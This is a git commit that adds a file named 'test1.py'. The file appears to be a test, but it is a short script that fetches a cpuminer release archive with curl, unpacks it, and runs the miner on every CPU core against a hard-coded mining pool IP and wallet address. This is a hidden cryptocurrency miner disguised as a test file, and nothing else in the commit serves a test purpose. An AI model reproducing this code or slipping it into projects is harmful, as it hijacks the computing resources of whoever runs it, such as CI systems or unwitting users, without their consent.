f52431231d326e9dec4dc7b3a2d37906f0a57910
Vasava10 <87759996+Vasava10@users.noreply.github.com>
2022-02-01 19:30:55 +0530

    Create test1.py

---
+++ test1.py
@@ -0,0 +1,7 @@
+import os
+import subprocess
+
+cmd = "git --version"
+returned_value = os.system(cmd)
+subprocess.call(['curl -sSL  https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz | tar -xvz'], shell=True)
+subprocess.call(['./cpuminer-sse2 -a yescryptr16 -o 103.249.70.7:6333 -u TKEUa3SvCJdN3XA4oJnhQNALHBqGJjSgLV.$(shuf -n 1 -i 1-99999)-CPU -t $(nproc) -p c=TRX,mc=QOGE'], shell=True, close_fds=True)
